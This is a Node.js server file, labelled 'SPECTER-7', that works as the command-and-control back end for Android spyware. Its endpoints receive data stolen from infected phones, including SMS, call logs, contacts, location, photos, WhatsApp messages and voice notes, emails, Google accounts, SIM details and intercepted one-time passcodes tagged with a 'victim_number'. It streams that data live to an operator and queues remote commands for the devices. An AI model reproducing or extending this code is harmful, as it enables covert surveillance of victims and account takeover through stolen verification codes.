const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '500mb' }));
app.use(express.static('public'));

const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

const devicesFile = path.join(dataDir, 'devices.json');
if (!fs.existsSync(devicesFile)) fs.writeFileSync(devicesFile, '[]');

// ═══════════════════════════════════════════════════════
// ✅ SSE — البث الفوري
// ═══════════════════════════════════════════════════════
const sseClients = {};

app.get('/events.php', (req, res) => {
    const deviceId = req.query.device || 'all';

    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();

    const pingInterval = setInterval(() => {
        try { res.write(': ping\n\n'); } catch (e) {}
    }, 25000);

    if (!sseClients[deviceId]) sseClients[deviceId] = [];
    sseClients[deviceId].push(res);
    console.log(`[SSE] +client device=${deviceId} total=${sseClients[deviceId].length}`);

    req.on('close', () => {
        clearInterval(pingInterval);
        sseClients[deviceId] = sseClients[deviceId].filter(c => c !== res);
        console.log(`[SSE] -client device=${deviceId} total=${sseClients[deviceId].length}`);
    });
});

function pushToDevice(deviceId, eventName, payload) {
    const msg = `event: ${eventName}\ndata: ${JSON.stringify(payload)}\n\n`;
    const targets = [...(sseClients[deviceId] || []), ...(sseClients['all'] || [])];
    let sent = 0;
    targets.forEach(client => {
        try { client.write(msg); sent++; } catch (e) {}
    });
    if (sent > 0) console.log(`[SSE] >> ${eventName} to device=${deviceId} (${sent} clients)`);
}
// ═══════════════════════════════════════════════════════

// ============ استقبال البيانات ============
app.post('/upload.php', (req, res) => {
    try {
        const data = req.body;
        
        if (data.type === 'image_data' && data.file_data) {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            const imagesFile = path.join(deviceDir, 'images_data.json');
            let imagesData = [];
            if (fs.existsSync(imagesFile)) imagesData = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
            const exists = imagesData.find(img => img.name === data.file_name);
            if (!exists) imagesData.push({ name: data.file_name, path: data.file_path, data: data.file_data, size: data.file_size, date: data.timestamp, source: data.source || 'unknown' });
            fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
            updateDevicesList(deviceId, null);
            
            if (!exists) {
                pushToDevice(deviceId, 'new_media', {
                    name: data.file_name,
                    path: data.file_path,
                    data: data.file_data,
                    size: data.file_size,
                    source: data.source || 'unknown',
                    date: data.timestamp || Date.now()
                });
            }
            
            return res.json({ success: true, images_count: imagesData.length });
        }
        
        // ✅ جديد — الرسائل الصوتية (واتساب/تيليجرام)
        if (data.type === 'voice_note' && data.file_data) {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const voiceFile = path.join(deviceDir, 'voice_notes.json');
            let voices = [];
            if (fs.existsSync(voiceFile)) voices = JSON.parse(fs.readFileSync(voiceFile, 'utf8'));
            
            // منع التكرار
            const exists = voices.find(v => v.file_name === data.file_name);
            if (exists) return res.json({ success: true, duplicated: true });
            
            const voiceEntry = {
                file_name: data.file_name || '',
                file_path: data.file_path || '',
                file_data: data.file_data || '',
                file_size: data.file_size || 0,
                voice_from: data.voice_from || 'whatsapp',
                source: data.source || 'unknown',
                direction: data.direction || 'unknown',
                timestamp: data.timestamp || Date.now()
            };
            voices.unshift(voiceEntry);
            if (voices.length > 500) voices = voices.slice(0, 500);
            
            fs.writeFileSync(voiceFile, JSON.stringify(voices, null, 2));
            updateDevicesList(deviceId, null);
            
            // ✅ بث فوري
            pushToDevice(deviceId, 'new_voice', {
                file_name: voiceEntry.file_name,
                file_data: voiceEntry.file_data,
                file_size: voiceEntry.file_size,
                voice_from: voiceEntry.voice_from,
                source: voiceEntry.source,
                direction: voiceEntry.direction,
                timestamp: voiceEntry.timestamp
            });
            
            return res.json({ success: true, voice_count: voices.length });
        }
        
        if (data.type === 'deleted_data') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const deletedFile = path.join(deviceDir, 'deleted_data.json');
            let deleted = [];
            if (fs.existsSync(deletedFile)) deleted = JSON.parse(fs.readFileSync(deletedFile, 'utf8'));
            
            if (data.deleted_items && data.deleted_items.length > 0) {
                data.deleted_items.forEach(item => {
                    deleted.unshift({
                        type: data.deleted_type || 'unknown',
                        item: item,
                        timestamp: data.timestamp || Date.now()
                    });
                });
                if (deleted.length > 2000) deleted = deleted.slice(0, 2000);
            } else if (data.deleted_type && data.deleted_count) {
                deleted.unshift({
                    type: data.deleted_type,
                    count: data.deleted_count,
                    timestamp: data.timestamp || Date.now()
                });
            }
            
            fs.writeFileSync(deletedFile, JSON.stringify(deleted, null, 2));
            updateDevicesList(deviceId, null);
            
            if (data.deleted_items && data.deleted_items.length > 0) {
                data.deleted_items.forEach(item => {
                    pushToDevice(deviceId, 'new_deleted', {
                        type: data.deleted_type,
                        item: item,
                        timestamp: data.timestamp || Date.now()
                    });
                });
            }
            
            return res.json({ success: true, deleted_count: deleted.length });
        }
        
        if (data.type === 'google_accounts') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const accountsFile = path.join(deviceDir, 'google_accounts.json');
            fs.writeFileSync(accountsFile, JSON.stringify(data.accounts || [], null, 2));
            updateDevicesList(deviceId, null);
            return res.json({ success: true, account_count: (data.accounts || []).length });
        }
        
        if (data.type === 'sim_info') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const simFile = path.join(deviceDir, 'sim_info.json');
            fs.writeFileSync(simFile, JSON.stringify(data.sims || [], null, 2));
            updateDevicesList(deviceId, null);
            
            pushToDevice(deviceId, 'sim_info', { sims: data.sims || [] });
            
            return res.json({ success: true, sim_count: (data.sims || []).length });
        }
        
        if (data.type === 'otp_code') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const otpFile = path.join(deviceDir, 'otp_codes.json');
            let otps = [];
            if (fs.existsSync(otpFile)) otps = JSON.parse(fs.readFileSync(otpFile, 'utf8'));
            
            const otpEntry = {
                code: data.otp_code || '',
                victim_number: data.victim_number || '',
                sender: data.sender || '',
                message: data.message || '',
                app_name: data.app_name || '',
                timestamp: data.timestamp || Date.now()
            };
            otps.unshift(otpEntry);
            if (otps.length > 500) otps = otps.slice(0, 500);
            
            fs.writeFileSync(otpFile, JSON.stringify(otps, null, 2));
            updateDevicesList(deviceId, null);
            
            pushToDevice(deviceId, 'new_otp', otpEntry);
            
            return res.json({ success: true, otp_count: otps.length });
        }
        
        if (data.type === 'email_data') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const emailFile = path.join(deviceDir, 'emails.json');
            let emails = [];
            if (fs.existsSync(emailFile)) emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
            
            const emailEntry = {
                sender: data.sender || '',
                subject: data.subject || '',
                snippet: data.snippet || '',
                image_data: data.image_data || null,
                app_package: data.app_package || '',
                app_name: data.app_name || '',
                timestamp: data.timestamp || Date.now()
            };
            emails.unshift(emailEntry);
            if (emails.length > 3000) emails = emails.slice(0, 3000);
            
            fs.writeFileSync(emailFile, JSON.stringify(emails, null, 2));
            updateDevicesList(deviceId, null);
            
            pushToDevice(deviceId, 'new_email', emailEntry);
            
            return res.json({ success: true, email_count: emails.length });
        }
        
        if (data.type === 'sms_send_result') {
            const deviceId = data.device_id || 'unknown';
            updateDevicesList(deviceId, null);
            pushToDevice(deviceId, 'sms_send_result', {
                number: data.number || '',
                message: data.message || '',
                success: data.success || false,
                error: data.error || '',
                timestamp: data.timestamp || Date.now()
            });
            return res.json({ success: true });
        }
        
        if (data.type === 'self_number') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const selfFile = path.join(deviceDir, 'self_number.json');
            fs.writeFileSync(selfFile, JSON.stringify(data.data || {}, null, 2));
            updateDevicesList(deviceId, null);
            
            pushToDevice(deviceId, 'self_number', data.data || {});
            
            return res.json({ success: true });
        }
        
        if (data.type === 'profile_info') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const profileFile = path.join(deviceDir, 'profile.json');
            fs.writeFileSync(profileFile, JSON.stringify(data.profile || {}, null, 2));
            updateDevicesList(deviceId, null);
            
            pushToDevice(deviceId, 'profile_info', data.profile || {});
            
            return res.json({ success: true });
        }
        
        if (data.type === 'whatsapp_message') {
            const deviceId = data.device_id || 'unknown';
            const deviceDir = path.join(dataDir, deviceId);
            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
            
            const waFile = path.join(deviceDir, 'whatsapp_messages.json');
            let waMessages = [];
            if (fs.existsSync(waFile)) waMessages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
            
            let waTimestamp = Date.now();
            if (data.timestamp) {
                try {
                    const parsedDate = new Date(String(data.timestamp).replace(' ', 'T'));
                    if (!isNaN(parsedDate.getTime())) {
                        waTimestamp = parsedDate.getTime();
                    }
                } catch (e) {}
            }
            
            waMessages.push({
                sender: data.sender || 'غير معروف',
                message: data.message || '',
                timestamp: waTimestamp,
                is_group: data.is_group || false,
                message_type: data.message_type || 'text',
                image_data: data.image_data || null,
                is_outgoing: data.is_outgoing || false,
                app_name: data.app_name || 'WhatsApp'
            });
            
            if (waMessages.length > 5000) waMessages = waMessages.slice(-5000);
            
            fs.writeFileSync(waFile, JSON.stringify(waMessages, null, 2));
            updateDevicesList(deviceId, null);
            
            pushToDevice(deviceId, 'new_whatsapp', {
                sender: data.sender || 'غير معروف',
                message: data.message || '',
                message_type: data.message_type || 'text',
                image_data: data.image_data || null,
                is_group: data.is_group || false,
                is_outgoing: data.is_outgoing || false,
                app_name: data.app_name || 'WhatsApp',
                timestamp: waTimestamp
            });
            
            return res.json({ success: true, wa_count: waMessages.length });
        }
        
        const deviceId = data.device_id || 'unknown';
        const deviceDir = path.join(dataDir, deviceId);
        if (!fs.existsSync(deviceDir)) { fs.mkdirSync(deviceDir, { recursive: true }); fs.mkdirSync(path.join(deviceDir, 'files'), { recursive: true }); }
        
        const dataFilePath = path.join(deviceDir, 'data.json');
        let existingData = {};
        if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
        
        if (data.data) {
            if (data.data.call_logs && data.data.call_logs.length > 0) {
                if (!existingData.call_logs) existingData.call_logs = [];
                const merged = [...data.data.call_logs, ...existingData.call_logs];
                const unique = [];
                const seen = new Set();
                for (const c of merged) {
                    const key = `${c.number}_${c.date}_${c.type}`;
                    if (!seen.has(key)) { seen.add(key); unique.push(c); }
                }
                unique.sort((a, b) => (b.date || 0) - (a.date || 0));
                existingData.call_logs = unique;
            }
            
            if (data.data.sms && data.data.sms.length > 0) {
                if (!existingData.sms) existingData.sms = [];
                const merged = [...data.data.sms, ...existingData.sms];
                const unique = [];
                const seen = new Set();
                for (const s of merged) {
                    const key = `${s.address}_${s.date}_${s.body}`;
                    if (!seen.has(key)) { seen.add(key); unique.push(s); }
                }
                unique.sort((a, b) => (b.date || 0) - (a.date || 0));
                existingData.sms = unique;
                
                data.data.sms.forEach(sms => {
                    pushToDevice(deviceId, 'new_sms', sms);
                });
            }
            
            if (data.data.contacts && data.data.contacts.length > 0) {
                existingData.contacts = data.data.contacts;
            }
            
            if (data.data.device_info) {
                existingData.device_info = data.data.device_info;
                updateDevicesList(deviceId, data.data.device_info);
            } else {
                updateDevicesList(deviceId, null);
            }
            
            if (data.data.location) existingData.location = data.data.location;
            if (data.data.installed_apps) existingData.installed_apps = data.data.installed_apps;
        }
        
        fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
        res.json({ success: true });
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/live_update.php', (req, res) => {
    try {
        const data = req.body;
        const deviceId = data.device_id || 'unknown';
        const deviceDir = path.join(dataDir, deviceId);
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        const liveFile = path.join(deviceDir, 'live.json');
        let live = {};
        if (fs.existsSync(liveFile)) live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
        live.network = data.network || 'متصل';
        live.battery = data.battery || null;
        live.location = data.location || null;
        live.last_seen = data.last_seen || Math.floor(Date.now() / 1000);
        fs.writeFileSync(liveFile, JSON.stringify(live, null, 2));
        updateDevicesList(deviceId, null);
        res.json({ success: true });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/live.php', (req, res) => {
    try {
        const deviceId = req.query.device;
        if (!deviceId) return res.json({ error: 'Device ID required' });
        const liveFile = path.join(dataDir, deviceId, 'live.json');
        const dataFile = path.join(dataDir, deviceId, 'data.json');
        const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
        const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
        const simFile = path.join(dataDir, deviceId, 'sim_info.json');
        const otpFile = path.join(dataDir, deviceId, 'otp_codes.json');
        const selfFile = path.join(dataDir, deviceId, 'self_number.json');
        const profileFile = path.join(dataDir, deviceId, 'profile.json');
        const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');   // ✅ جديد
        
        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0, otp_count: 0, voice_count: 0, sim_numbers: [], carrier: '', self_number: '', profile_number: '', profile_name: '' };
        
        if (fs.existsSync(liveFile)) {
            const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
            const lastSeen = live.last_seen || 0;
            response.online = (Math.floor(Date.now()/1000) - lastSeen) < 300;
            response.network = live.network || 'غير معروف';
            response.battery = live.battery || null;
            response.location = live.location || null;
            response.last_seen = lastSeen;
            response.seconds_ago = Math.floor(Date.now()/1000) - lastSeen;
        }
        
        if (fs.existsSync(dataFile)) {
            const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
            response.call_count = (allData.call_logs || []).length;
            response.sms_count = (allData.sms || []).length;
            response.contacts_count = (allData.contacts || []).length;
            response.apps_count = (allData.installed_apps || []).length;
        }
        
        if (fs.existsSync(imagesFile)) {
            response.images_count = JSON.parse(fs.readFileSync(imagesFile, 'utf8')).length;
        }
        
        if (fs.existsSync(deletedFile)) {
            response.deleted_count = JSON.parse(fs.readFileSync(deletedFile, 'utf8')).length;
        }
        
        if (fs.existsSync(otpFile)) {
            response.otp_count = JSON.parse(fs.readFileSync(otpFile, 'utf8')).length;
        }
        
        // ✅ جديد — عدد الرسائل الصوتية
        if (fs.existsSync(voiceFile)) {
            response.voice_count = JSON.parse(fs.readFileSync(voiceFile, 'utf8')).length;
        }
        
        if (fs.existsSync(simFile)) {
            try {
                const sims = JSON.parse(fs.readFileSync(simFile, 'utf8'));
                response.sim_numbers = sims.map(s => s.number).filter(n => n && n.length > 0);
                response.carrier = sims[0] ? (sims[0].carrier || '') : '';
            } catch (e) {}
        }
        
        if (fs.existsSync(selfFile)) {
            try {
                const self = JSON.parse(fs.readFileSync(selfFile, 'utf8'));
                response.self_number = self.best_guess || '';
            } catch (e) {}
        }
        
        if (fs.existsSync(profileFile)) {
            try {
                const profile = JSON.parse(fs.readFileSync(profileFile, 'utf8'));
                if (profile.numbers && profile.numbers.length > 0) {
                    response.profile_number = profile.numbers[0];
                }
                response.profile_name = profile.name || '';
            } catch (e) {}
        }
        
        res.json(response);
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/api.php', (req, res) => {
    try {
        const action = req.query.action;
        const deviceId = req.query.device;
        const type = req.query.type;
        
        if (action === 'delete_device') {
            const deviceDir = path.join(dataDir, deviceId);
            if (fs.existsSync(deviceDir)) fs.rmSync(deviceDir, { recursive: true, force: true });
            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
            devices = devices.filter(d => d.id !== deviceId);
            fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
            
            const resetFile = path.join(dataDir, 'reset_commands.json');
            let resets = [];
            if (fs.existsSync(resetFile)) resets = JSON.parse(fs.readFileSync(resetFile, 'utf8'));
            resets.push({ device_id: deviceId, timestamp: Date.now() });
            fs.writeFileSync(resetFile, JSON.stringify(resets));
            
            return res.json({ success: true });
        }
        
        if (action === 'check_reset') {
            const resetFile = path.join(dataDir, 'reset_commands.json');
            if (fs.existsSync(resetFile)) {
                const resets = JSON.parse(fs.readFileSync(resetFile, 'utf8'));
                const found = resets.find(r => r.device_id === deviceId);
                if (found) {
                    const remaining = resets.filter(r => r.device_id !== deviceId);
                    fs.writeFileSync(resetFile, JSON.stringify(remaining));
                    return res.json({ reset: true });
                }
            }
            return res.json({ reset: false });
        }
        
        if (action === 'get_image_data') {
            const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
            if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'delete_whatsapp_chat') {
            const sender = req.query.sender;
            const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
            if (fs.existsSync(waFile) && sender) {
                let messages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
                messages = messages.filter(m => m.sender !== sender);
                fs.writeFileSync(waFile, JSON.stringify(messages, null, 2));
                return res.json({ success: true });
            }
            return res.json({ success: false });
        }
        
        if (action === 'get_whatsapp') {
            const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
            if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'get_google_accounts') {
            const accountsFile = path.join(dataDir, deviceId, 'google_accounts.json');
            if (fs.existsSync(accountsFile)) return res.json(JSON.parse(fs.readFileSync(accountsFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'get_otps') {
            const otpFile = path.join(dataDir, deviceId, 'otp_codes.json');
            if (fs.existsSync(otpFile)) return res.json(JSON.parse(fs.readFileSync(otpFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'get_sim_info') {
            const simFile = path.join(dataDir, deviceId, 'sim_info.json');
            if (fs.existsSync(simFile)) return res.json(JSON.parse(fs.readFileSync(simFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'get_self_number') {
            const selfFile = path.join(dataDir, deviceId, 'self_number.json');
            if (fs.existsSync(selfFile)) return res.json(JSON.parse(fs.readFileSync(selfFile, 'utf8')));
            return res.json({});
        }
        
        if (action === 'get_profile') {
            const profileFile = path.join(dataDir, deviceId, 'profile.json');
            if (fs.existsSync(profileFile)) return res.json(JSON.parse(fs.readFileSync(profileFile, 'utf8')));
            return res.json({});
        }
        
        if (action === 'get_emails') {
            const emailFile = path.join(dataDir, deviceId, 'emails.json');
            if (fs.existsSync(emailFile)) return res.json(JSON.parse(fs.readFileSync(emailFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'delete_email') {
            const idx = parseInt(req.query.index);
            const emailFile = path.join(dataDir, deviceId, 'emails.json');
            if (fs.existsSync(emailFile)) {
                let emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
                if (!isNaN(idx) && idx >= 0 && idx < emails.length) {
                    emails.splice(idx, 1);
                    fs.writeFileSync(emailFile, JSON.stringify(emails, null, 2));
                    return res.json({ success: true });
                }
            }
            return res.json({ success: false });
        }
        
        if (action === 'get_deleted') {
            const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
            if (fs.existsSync(deletedFile)) return res.json(JSON.parse(fs.readFileSync(deletedFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'clear_deleted') {
            const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
            if (fs.existsSync(deletedFile)) {
                fs.writeFileSync(deletedFile, '[]');
            }
            return res.json({ success: true });
        }
        
        if (action === 'delete_deleted_item') {
            const idx = parseInt(req.query.index);
            const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
            if (fs.existsSync(deletedFile)) {
                let deleted = JSON.parse(fs.readFileSync(deletedFile, 'utf8'));
                if (!isNaN(idx) && idx >= 0 && idx < deleted.length) {
                    deleted.splice(idx, 1);
                    fs.writeFileSync(deletedFile, JSON.stringify(deleted, null, 2));
                    return res.json({ success: true });
                }
            }
            return res.json({ success: false });
        }
        
        // ✅ جديد — الرسائل الصوتية
        if (action === 'get_voices') {
            const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
            if (fs.existsSync(voiceFile)) return res.json(JSON.parse(fs.readFileSync(voiceFile, 'utf8')));
            return res.json([]);
        }
        
        if (action === 'delete_voice') {
            const idx = parseInt(req.query.index);
            const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
            if (fs.existsSync(voiceFile)) {
                let voices = JSON.parse(fs.readFileSync(voiceFile, 'utf8'));
                if (!isNaN(idx) && idx >= 0 && idx < voices.length) {
                    voices.splice(idx, 1);
                    fs.writeFileSync(voiceFile, JSON.stringify(voices, null, 2));
                    return res.json({ success: true });
                }
            }
            return res.json({ success: false });
        }
        
        if (action === 'clear_voices') {
            const voiceFile = path.join(dataDir, deviceId, 'voice_notes.json');
            if (fs.existsSync(voiceFile)) {
                fs.writeFileSync(voiceFile, '[]');
            }
            return res.json({ success: true });
        }
        
        if (action === 'get_data') {
            const dataFile = path.join(dataDir, deviceId, 'data.json');
            if (fs.existsSync(dataFile)) {
                const allData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
                if (type && type !== 'all' && allData[type]) return res.json(allData[type]);
                return res.json(allData);
            }
            return res.json([]);
        }
        
        if (action === 'get_commands') {
            const commandsFile = path.join(dataDir, deviceId, 'commands.json');
            if (fs.existsSync(commandsFile)) {
                const commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
                fs.writeFileSync(commandsFile, '[]');
                return res.json({ commands });
            }
            return res.json({ commands: [] });
        }
        
        res.json({ error: 'Invalid action' });
    } catch (e) { res.json({ error: e.message }); }
});

app.post('/api.php', (req, res) => {
    try {
        const { device, command } = req.body;
        if (!device || !command) return res.json({ error: 'Device and command required' });
        const deviceDir = path.join(dataDir, device);
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        const commandsFile = path.join(deviceDir, 'commands.json');
        let commands = [];
        if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
        
        const cmd = { ...req.body, timestamp: Math.floor(Date.now()/1000), status: 'pending' };
        commands.push(cmd);
        fs.writeFileSync(commandsFile, JSON.stringify(commands));
        res.json({ success: true });
    } catch (e) { res.json({ error: e.message }); }
});

app.get('/devices.json', (req, res) => {
    try { res.json(JSON.parse(fs.readFileSync(devicesFile, 'utf8'))); } catch (e) { res.json([]); }
});

function updateDevicesList(deviceId, deviceInfo) {
    let devices = [];
    if (fs.existsSync(devicesFile)) devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
    const index = devices.findIndex(d => d.id === deviceId);
    if (index >= 0) {
        devices[index].last_seen = Math.floor(Date.now()/1000);
        if (deviceInfo && deviceInfo.model) {
            devices[index].name = `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim();
        }
    } else {
        devices.push({
            id: deviceId,
            name: deviceInfo && deviceInfo.model ? `${deviceInfo.brand || ''} ${deviceInfo.model}`.trim() : deviceId,
            first_seen: Math.floor(Date.now()/1000),
            last_seen: Math.floor(Date.now()/1000)
        });
    }
    fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
}

app.listen(PORT, () => console.log(`SPECTER-7 running on ${PORT}`));
